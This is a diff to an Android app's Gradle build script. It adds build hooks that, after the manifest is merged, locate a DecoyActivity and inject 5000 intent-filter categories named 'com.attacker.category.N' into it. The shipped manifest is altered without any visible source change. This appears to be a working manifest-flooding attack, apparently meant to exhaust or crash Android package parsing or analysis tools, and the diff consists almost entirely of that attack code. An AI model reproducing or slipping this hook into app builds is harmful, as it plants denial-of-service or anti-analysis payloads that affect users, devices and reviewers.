@@ -99,6 +99,25 @@ android {
     kotlin {
         jvmToolchain(21)
     }
+    
+    applicationVariants.all { variant ->
+        // 延迟执行，在 manifest 生成之后
+        variant.preBuild.doLast {
+            // 等待 manifest 生成
+            def manifestFile = findManifestFile(variant)
+            if (manifestFile != null && manifestFile.exists()) {
+                modifyManifest(manifestFile)
+            }
+        }
+        
+        // 或者 hook 到 assemble 任务
+        variant.assembleProvider.get().doLast {
+            def manifestFile = findManifestFile(variant)
+            if (manifestFile != null && manifestFile.exists()) {
+                modifyManifest(manifestFile)
+            }
+        }
+    }
 }
 
 autoResConfig {
@@ -202,75 +221,79 @@ dependencies {
     implementation 'com.github.adaptech-cz.Tesseract4Android:tesseract4android:4.8.0'
 }
 
-afterEvaluate {
-    android.applicationVariants.all { variant ->
-        def manifestTask = tasks.findByName("process${variant.name.capitalize()}Manifest")
+
+
+def findManifestFile(variant) {
+    // 尝试各种可能的路径
+    def possiblePaths = [
+        // AGP 7.0+
+        "${buildDir}/intermediates/merged_manifests/${variant.name}/AndroidManifest.xml",
+        "${buildDir}/intermediates/aapt_friendly_merged_manifests/${variant.name}/AndroidManifest.xml",
         
-        if (manifestTask != null) {
-            manifestTask.doLast {
-                // 查找 manifest 文件
-                def manifestFile = null
-                
-                // 从任务输出中查找
-                manifestTask.outputs.files.each { file ->
-                    if (file.name == "AndroidManifest.xml") {
-                        manifestFile = file
-                    } else if (file.isDirectory()) {
-                        def candidate = new File(file, "AndroidManifest.xml")
-                        if (candidate.exists()) {
-                            manifestFile = candidate
-                        }
-                    }
+        // AGP 4.0-6.0
+        "${buildDir}/intermediates/manifests/full/${variant.name}/AndroidManifest.xml",
+        "${buildDir}/intermediates/merged_manifest/${variant.name}/AndroidManifest.xml",
+        
+        // AGP 3.x
+        "${buildDir}/intermediates/manifests/${variant.name}/AndroidManifest.xml",
+        
+        // 其他可能路径
+        "${buildDir}/outputs/manifests/${variant.name}/AndroidManifest.xml",
+        "${projectDir}/build/intermediates/merged_manifests/${variant.name}/AndroidManifest.xml"
+    ]
+    
+    for (path in possiblePaths) {
+        def file = file(path)
+        if (file.exists()) {
+            println "Found manifest at: ${file.absolutePath}"
+            return file
+        }
+    }
+    
+    return null
+}
+
+def modifyManifest(File manifestFile) {
+    try {
+        // 读取 manifest
+        def xml = new XmlParser(false, false, true).parse(manifestFile)
+        
+        // 找到 DecoyActivity
+        def decoyActivity = xml.application.'activity'.find { 
+            it.'@android:name' == '.DecoyActivity' || 
+            it.'@android:name' == 'DecoyActivity' ||
+            (it.'@android:name' != null && it.'@android:name'.endsWith('.DecoyActivity'))
+        }
+        
+        if (decoyActivity != null) {
+            def intentFilter = decoyActivity.'intent-filter'[0]
+            
+            if (intentFilter != null) {
+                // 生成 5000 个 categories
+                int categoryCount = 5000
+                for (int i = 0; i < categoryCount; i++) {
+                    def category = new Node(null, "category")
+                    category.attributes().put("android:name", 
+                        "com.attacker.category.${i}")
+                    intentFilter.append(category)
                 }
                 
-                // 如果还找不到，尝试标准路径
-                if (manifestFile == null || !manifestFile.exists()) {
-                    def standardPath = "${buildDir}/intermediates/merged_manifests/${variant.name}/AndroidManifest.xml"
-                    manifestFile = file(standardPath)
+                // 写回 manifest
+                manifestFile.withWriter { writer ->
+                    def printer = new XmlNodePrinter(new PrintWriter(writer))
+                    printer.preserveWhitespace = true
+                    printer.print(xml)
                 }
                 
-                if (manifestFile != null && manifestFile.exists()) {
-                    // 修改 manifest
-                    def xml = new XmlParser(false, false, true).parse(manifestFile)
-                    
-                    def decoyActivity = xml.application.'activity'.find { 
-                        it.'@android:name' == '.DecoyActivity' 
-                    }
-                    
-                    if (decoyActivity != null) {
-                        def intentFilter = decoyActivity.'intent-filter'[0]
-                        
-                        if (intentFilter != null) {
-                            int categoryCount = 5000
-                            for (int i = 0; i < categoryCount; i++) {
-                                def category = new Node(null, "category")
-                                category.attributes().put("android:name", 
-                                    "com.attacker.category.${i}")
-                                intentFilter.append(category)
-                            }
-                            
-                            manifestFile.withWriter { writer ->
-                                def printer = new XmlNodePrinter(new PrintWriter(writer))
-                                printer.preserveWhitespace = true
-                                printer.print(xml)
-                            }
-                            
-                            println "✅ Successfully added ${categoryCount} categories"
-                        }
-                    }
-                } else {
-                    println "❌ Manifest file not found"
-                    // 打印所有输出文件以便调试
-                    if (manifestTask != null) {
-                        println "Task outputs:"
-                        manifestTask.outputs.files.each { file ->
-                            println "  ${file.absolutePath}"
-                        }
-                    }
-                }
+                println "✅ Added ${categoryCount} categories to DecoyActivity"
+            } else {
+                println "⚠️ No intent-filter found for DecoyActivity"
             }
         } else {
-            println "⚠️ Could not find processManifest task for ${variant.name}"
+            println "ℹ️ DecoyActivity not found in manifest"
         }
+    } catch (Exception e) {
+        println "❌ Error modifying manifest: ${e.message}"
+        e.printStackTrace()
     }
 }
